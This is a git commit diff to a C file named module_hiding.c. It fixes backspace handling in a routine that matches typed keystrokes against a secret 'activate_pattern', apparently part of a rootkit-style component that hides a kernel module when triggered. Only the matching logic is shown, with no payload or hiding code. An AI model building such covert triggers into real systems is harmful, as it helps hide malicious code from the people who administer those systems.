96acdb79191cf2dc5d9c1157e197632499bb62f2
Roman Karlstetter <roman@rm-karlstetter.de>
2011-11-29 14:31:50 +0100

    everything SHOULD work now

--- module_hiding.c
+++ module_hiding.c
@@ -92,18 +92,22 @@ static void handleChar(char c){
 //            OUR_DEBUG("match %c", c);
             last_match++;
             cur_position++;
-        } else if(c == 127) { // backspace (why would one want to do this is this case?)
+        } else if(c == 127 || c == '\b') { // backspace (why would one want to do this is this case?)
 //            OUR_DEBUG("backspace but right");
-            last_match--;
-            cur_position--;
+            if(cur_position != 0){
+                last_match--;
+                cur_position--;
+            }
         } else { // wrong char
 //            OUR_DEBUG("no match: %c, expected %c", c, activate_pattern[cur_position]);
             cur_position++;
         }
     } else { // the previous chars don't match, but there might be backspaces and therefore we count the read input up and down
-        if(c == 127){
+        if(c == 127 || c == '\b'){
 //            OUR_DEBUG("backspace wrong");
-            cur_position--;
+            if(cur_position != 0){
+                cur_position--;
+            }
         } else {
 //            OUR_DEBUG("wrong char: %c (as int: %d)", c, (int)c);
             cur_position++;
